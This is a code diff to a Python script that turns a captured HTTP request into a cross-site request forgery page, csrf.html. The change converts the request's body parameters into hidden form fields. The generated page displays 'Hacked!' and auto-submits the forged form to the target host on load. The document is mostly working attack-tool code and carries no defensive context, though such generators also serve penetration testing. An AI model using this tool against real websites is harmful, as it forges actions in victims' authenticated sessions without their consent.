@@ -33,6 +33,8 @@ def Main():
     global contentlength
     global cookie
     global body
+    global stuff
+    global inputType
 
     for i in range(len(data)):
         if ("POST" in str(data[i])):
@@ -64,9 +66,10 @@ def Main():
         elif ("=" in str(data[i])):
             body = str(data[i]).strip()
             params = body.split("&")
-            print ("[+] Use the following parameters (name/value pairs) to complete POC\n")
+            inputType = ""
             for param in params:
-                print (param)
+                stuff = (param.split("="))
+                inputType += (f"   <input type=\"hidden\" " + "name=\""+stuff[0]+ "\"" + " value=\"" + stuff[1]+ "\" " + "/>" + "\r\n ")
 
 def writeFile():
     print ("\n[+] Output file: csrf.html")
@@ -75,7 +78,8 @@ def writeFile():
         make_html += ("<body>" + "\r\n ")
         make_html += ("Hacked!" + "\r\n ")
         make_html += ("  <form action=\"https://" + host + route + "\" " + "method=\"" + method + "\"" + ">" + "\r\n ")
-        make_html += ("   <input type=\"hidden\" " + "name=\"\" " + "value=\"\"" + "/>" + "\r\n ")
+        # make_html += ("   <input type=\"hidden\" " + "name=\"\" " + "value=\"\"" + "/>" + "\r\n ")
+        make_html += inputType
         make_html += ("  </form>" + "\r\n ")
         make_html += ("   <script>" + "\r\n ")
         make_html += ("      document.forms[0].submit();" + "\r\n ")
